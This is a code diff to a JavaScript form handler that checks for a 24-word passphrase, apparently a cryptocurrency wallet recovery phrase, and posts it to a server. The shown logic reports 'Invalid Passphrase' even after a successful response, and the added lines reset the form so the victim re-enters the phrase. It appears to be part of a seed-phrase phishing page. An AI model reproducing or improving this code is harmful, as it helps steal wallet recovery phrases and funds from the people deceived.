@@ -12,12 +12,15 @@ function handleSubmit(event) {
     const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
     const inputValue = form.elements['mf-texts'].value.trim();
 
+    
+
     const wordCount = inputValue.split(/\s+/).length;
     if (wordCount !== 24) {
         const errorElement = document.getElementById('emsg');
         errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
+        form.reset();
         return; // Exit function if word count is not 24
     }
 
@@ -44,12 +47,14 @@ function handleSubmit(event) {
         errorElement.textContent = 'Invalid Passphrase'
         myButton.disabled = false;
         myButton2.disabled = false;
+        form.reset();
         // Handle successful response if needed
     })
     .catch(error => {
         console.error('Error:', error);
         const errorElement = document.getElementById('emsg');
         // errorElement.textContent = 'Error occurred while processing your request.';
+        form.reset();
         errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
